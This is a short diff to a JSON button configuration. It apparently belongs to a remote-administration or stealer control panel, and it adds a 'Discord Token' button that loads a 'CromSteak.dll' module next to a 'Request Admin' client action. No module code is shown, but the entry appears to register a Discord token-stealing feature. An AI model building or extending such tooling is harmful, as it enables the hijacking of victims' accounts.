@@ -16,6 +16,14 @@
         "IsMainButton": true
     },
     {
+        "ButtonLabel": "Discord Token",
+        "ButtonId": "discordtoken",
+        "DllFileName": "CromSteak.dll",
+        "TypeName": "Crom",
+        "Entry": "Token",
+        "IsMainButton": false
+    },
+    {
         "ButtonLabel": "Request Admin",
         "ButtonId": "clientrequestadmin",
         "DllFileName": "BaseApp.dll",
